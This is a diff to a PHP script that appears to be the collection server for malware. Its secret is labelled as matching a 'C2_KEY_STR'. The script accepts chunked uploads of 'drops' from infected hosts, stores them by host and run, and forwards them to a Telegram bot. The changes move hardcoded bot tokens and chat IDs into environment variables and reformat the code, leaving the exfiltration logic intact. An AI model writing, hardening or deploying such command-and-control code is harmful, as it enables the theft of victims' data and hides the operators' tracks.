@@ -1,16 +1,31 @@
+
 <?php
 declare(strict_types=1);
 
-$SECRET = getenv('SECRET') ?: 'CHANGE_ME_9f3a1c7b2d';   // must equal C2_KEY_STR
-$BOT    = getenv('BOT')    ?: '9121116193:AAGu2w4wpA';
-$CHAT   = getenv('CHAT')   ?: '609359';
+// Credentials are stored in Render, not GitHub.
+$SECRET = getenv('SECRET') ?: '';
+$BOT    = getenv('BOT') ?: '';
+$CHAT   = getenv('CHAT') ?: '';
 
 $STORE = getenv('STORE') ?: (sys_get_temp_dir() . '/drops');
 
-if (($_SERVER['HTTP_X_AUTH'] ?? '') !== $SECRET) { http_response_code(403); exit('no'); }
+// Check configuration.
+if ($SECRET === '' || $BOT === '' || $CHAT === '') {
+    error_log('Missing required environment variables');
+    http_response_code(500);
+    exit('Server configuration error');
+}
+
+if (($_SERVER['HTTP_X_AUTH'] ?? '') !== $SECRET) {
+    http_response_code(403);
+    exit('no');
+}
 
 $body = file_get_contents('php://input');
-if ($body === '') { http_response_code(400); exit('empty'); }
+if ($body === '') {
+    http_response_code(400);
+    exit('empty');
+}
 
 /* real client IP: proxy header first, REMOTE_ADDR last */
 function client_ip(): string {
@@ -54,7 +69,9 @@ $cap = function_exists('mb_substr')
     ? mb_substr($cap, 0, 1024, 'UTF-8')
     : substr($cap, 0, 1024);
 
-if (!is_dir($STORE)) { @mkdir($STORE, 0750, true); }
+if (!is_dir($STORE)) {
+    @mkdir($STORE, 0750, true);
+}
 
 $path = sprintf('%s/%s_%s_%s', $STORE, $host, $run, $name);
 file_put_contents($path, $body, $chunk > 1 ? FILE_APPEND : 0);
@@ -71,7 +88,9 @@ echo 'ok';
 if (function_exists('fastcgi_finish_request')) {
     fastcgi_finish_request();
 } else {
-    while (ob_get_level() > 0) { @ob_end_flush(); }
+    while (ob_get_level() > 0) {
+        @ob_end_flush();
+    }
     @flush();
 }
 
@@ -104,8 +123,13 @@ if (function_exists('curl_init')) {
 if (!$ok && $chunks === 1 && strlen($body) < 3500) {
     $ch = curl_init("https://api.telegram.org/bot{$BOT}/sendMessage");
     curl_setopt_array($ch, [
-        CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 20,
-        CURLOPT_POSTFIELDS => ['chat_id' => $CHAT, 'text' => "$cap\n\n$body"],
+        CURLOPT_POST => true,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT => 20,
+        CURLOPT_POSTFIELDS => [
+            'chat_id' => $CHAT,
+            'text' => "$cap\n\n$body",
+        ],
     ]);
     curl_exec($ch);
     curl_close($ch);
